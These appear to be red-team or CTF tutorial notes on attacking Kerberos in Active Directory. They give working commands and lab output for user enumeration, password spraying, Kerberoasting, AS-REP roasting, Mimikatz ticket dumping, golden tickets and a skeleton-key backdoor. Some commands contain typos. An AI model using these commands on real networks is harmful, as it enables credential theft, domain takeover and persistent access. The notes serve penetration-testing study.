---
title: Attacking Kerberos
description: Notes detailing how to attack kerberos as part of a RT engagement or CTF
date: 2024-06-12 13:29:00 +0100
categories: [Active Directory]
tags: [active directory, kerberos, windows]
---

# Attacking Kerberos
## Enumeration using `Kerbrute`
`Kerbrute` can brute force and enumerate valid active directory users by leveraging Kerberos pre-authentication. By using pre-authentication, you will not trigger the “account failed to log on” windows event. When using pre-authentication you can brute-force by sending a single UDP frame to the KDC, allowing you to enumerate the users from a wordlist.

### Installation
Find the latest version on GitHub and install to your system. Below works on Kali.

```bash
user@kali$ wget <https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64>
user@kali$ mv kerbrute_linux_amb64 kerbrute # rename
user@kali$ chmod +x kerbrute
user@kali$ ./kerbrute
...
```

You will also need a username list, a sample one can be found [here](https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt)
### Usage
```bash
user@kali ./kerbrute userenum --dc <DOMAIN_CONROLLER_IP> -d DOMAIN <USERNAME_LIST>.txt
# For example
user@kali ./kerbrute userenum --dc 10.10.217.22 -d CONTROLLER.local User.txt
	Version: v1.0.3 (9dad6e1) - 11/15/22 - Ronnie Flathers @ropnop
	
	2022/11/15 04:14:51 >  Using KDC(s):
	2022/11/15 04:14:51 >   10.10.217.22:88
	
	2022/11/15 04:14:51 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
	2022/11/15 04:14:51 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
	2022/11/15 04:14:51 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
	2022/11/15 04:14:52 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
	2022/11/15 04:14:52 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
	2022/11/15 04:14:52 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
	2022/11/15 04:14:52 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
	2022/11/15 04:14:52 >  [+] VALID USERNAME:       user1@CONTROLLER.local
	2022/11/15 04:14:52 >  [+] VALID USERNAME:       user2@CONTROLLER.local
	2022/11/15 04:14:52 >  [+] VALID USERNAME:       user3@CONTROLLER.local
	2022/11/15 04:14:52 >  Done! Tested 100 usernames (10 valid) in 0.603 seconds
```

## Harvesting & Brute Forcing Tickets with Rubeus
Some of the attacks that Rubeus supports include: overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and `Kerberoasting`.

[https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

### Harvesting Tickets
Harvesting tickets intercepts tickets that are being sent to the KDC and saves them for use in other attacks like pass-the-ticket attacks. These tickets contain information such as user, Start time, end time, renew date, flags, etc.

```bash
C:\\>Rubeus.exe harvest /interval:30
...
User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  11/15/2022 1:39:36 AM
  EndTime               :  11/15/2022 11:39:36 AM
  RenewTill             :  11/22/2022 1:39:36 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGjOzjcLNb6Cn/+Jl9UAU1IjbdQD1sHFK1o/B
...
```
### Brute Forcing and Password Spraying
Password spraying will take a given Kerberos-based password and spray it against all found users and give a `.kirbi` ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass-the-ticket attack.

Before attacking add IP to hosts file.

```bash
echo <IP_ADDRESS> <DOMAIN> >> C:\\Windows\\System32\\drivers\\etc\\hosts
echo 10.10.217.22 CONTROLLER.local >> C:\\Windows\\System32\\drivers\\etc\\hosts
```

```bash
C:\\>Rubeus.exe brute /password:Password1 /noticket
...
[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):
...
```
This attack can be noisy and may get you locked out, depending on login lockout policies.

## `Kerberoasting` with Rubeus and `Impacket`
`Kerberoasting` allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.

If the target service has a registered SPN, then it can be attacked. Chance of success depends on service account password strength, as well as what permissions the service account has. To enumerate attackable accounts, you can use a tool such as `BloodHound`.

### Service Accounts & Mitigation
If the service account is a domain admin, you have control similar of that of a golden / silver ticket and can now gather loot and exfiltrate.

If the service account isn’t a domain admin, you can use the account to pivot or you can use the cracked passwords to spray against other usernames.

In order to mitigate `kerberoasting`, you should use strong passwords for the service account - the passwords are less likely to be cracked if they are strong. As well as don’t make the service accounts domain admins - they don’t need to be admins.

### Using Rubeus
Once you have followed the steps to harvest tickets with Rubeus, you can run the following command

```bash
C:\\>Rubeus.exe kerberoast
..
[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2
[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
                             l:30111*$6A1256DDAE88BE81A151DADFAB6900A9$7A962A7D371BE9638639AB03E0E1FB461D8960 
                             1B0D1C4B0682C915A7BFEC1CFF7315FFC80DDDD46535559473186B171A48451EB561A8D667A4A1BB
...
```
Now you have the hash, you can easily crack is with `hashcat`

```bash
# Hash copied into hash.txt
user@machine$ hashcat-m 13100 -a 0 hash.txt rockyou.txt
>> Summer2020
>> MyPassword123
...
```
### Using `Impacket`
Installation:

[https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19)

- Follow the above GitHub link and install `Impacket`
- Move into the directory and `pip install .`

Usage:

```bash
user@machine$ cd /usr/share/doc/python3-impacket/examples/
user@machine$ sudo python3 GetUserSPNs.py DOMAIN.DOMAIN/USERNAME:PASSWORDD -dc-ip <DC_IP> -request
user@machine$ sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.217.22 -request
# This will dump the hash, you can then crack with hashcat
user@machine$ hashcat -m 13100 -a 0 hash.txt rockyou.txt
```

## AS-REP Roasting with Rubeus
AS-REP involves dumping `krbasrep5 hashes` of user accounts, it is effective against any users that have pre-authentication disabled. Unlike `kerberoasting`, these users do not have to be service accounts. The only requirement for the account is that pre-authentication is disabled.

Find valid accounts:
```shell
$ /home/kali/Tools/kerbrute_linux_amd64 userenum --dc services.thm -d services.local users.txt
```
Where `users.txt` contains usernames.

Other tools exist for this such as `[GetNPUsers.py](<http://GetNPUsers.py>)` from `Impacket`. Rubeus is easier because it automatically finds `AS-REP Roastable users`.

To use `GetNPUsers`:
```shell
$ impacket-GetNPUsers services.local/ -usersfile users.txt
```
Where `services.local` (REALM) points to the DC IP in `/etc/hosts`.
This will give you hash which you can crack with hash cat

During pre-authentication, the user’s hash will be used to encrypt a timestamp that the DC will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validation, the KDC will issue a TGT for the user. **If pre-authentication is disabled, you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline - no validate that the requester is legitimate.**

### Dumping Hashes
Run the Rubeus AS-REP roast command looking for vulnerable users and then dump found hashes.

```bash
C:\\>Rubeus.exe asreproast
...
[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::754d:c944:e9ba:9281%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:9CC612CBEF3DCB2409489D1E95A0E94A$2C3558AFAD56
      40606CE5AC1F781C27D75D584F4EA70CFF624DE57557CF65C768ED700C02BD206946AC27FC8AF144
...
```

These hashes can now be cracked offline with `hashcat`, see above steps.

Hash type for `hashcat` for AS-REP is `18200`

## Pass The Ticket with `Mimikatz`
`Mimikatz` used for dumping creds inside an AD network. Can also be used to dump a TGT from LSASS memory.

- `LSASS` stores credentials on an AD server and can store Kerberos tickets along with other credential types to act as the gatekeeper and accept / reject the credentials provides to the process.

You can dump the Kerberos tickets from LSASS just like hashes. When dumped, you will get a `.kirbi` ticket which can be used to gain domain admin if a domain admin ticket is in the `LSASS` memory. This attack is great for privilege escalation and lateral movement. This attack is basically just re-using a left over ticket from another user.

```bash
C:\\> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

This above command will output all of the ticket in `.kirbi` format into the directory you are currently working in.

Now you have the tickets, you use `mimkatz` to perform a pass the ticket attack as shown

```bash
mimikatz # kerberos:ptt <ticket>
```

Now, you can exit `mimikatz` and type `klist` to see if the attack worked and check what tickets are cached.

You should be able to now do administrative tasks such as look at the admin share.

## Golden and Silver Ticket Attacks with `Mimikatz`
Silver tickets are better in engagements as they are more discreet. The main difference is that the silver ticket is restricted to the service that is targeted, whereas the golden ticket works for any Kerberos service. A use case would be if you want to access the domain’s SQL server, but your current compromised account doesn’t have access to that server. You can get an accessible service account and then dump the service account hash and impersonate their TGT in order to request a service ticket for the SQL service from the KDC, allowing you access to the SQL server

**A golden ticket is dumping the TGT of `krbtgt` account. For a silver ticket, dump any service account or domain admin ticket.**

### Getting `Krbtgt` User Hashes

```bash
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 
RID  : 000001f6 (502)
User : krbtgt
 * Primary
    NTLM : 72cd714611b64cd4d5550cd2759db3f6
    LM   :
...
```

### Creating Golden / Silver Ticket
```bash
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<KRBTGT_SID> /krbtgt:<KRBTGT_NTLM_HASH> id:500
mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
```

To create a silver ticket, use the above command but change the ID to `1103` and change the `krbtgt` and `sid` to the values of the respective service account.

### Using The Silver / Golden Ticket To Access Other Machines
First open an elevated command prompt with the given ticket

```bash
mimikatz # misc::cmd
```

## Kerberos Backdoors / Skeleton Keys
The Kerberos backdoor acts as a rootkit, implanting itself into the memory of the domain forest, and allowing itself access to any of the machines with a single master password. The backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. **The backdoor only works using Kerberos RC4 Encryption.**

```bash
mimikatz # privilege::debug
mimikatz # misc:skeleton
```

That’s it!

The default credentials will be `mimikatz.`

example: `net use c:\\\\DOMAIN-CONTROLLER\\admin$ /user:Administrator mimikatz` - The share will now be accessible without the need for the Administrators password

example: `dir \\\\Desktop-1\\c$ /user:Machine1 mimikatz` - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1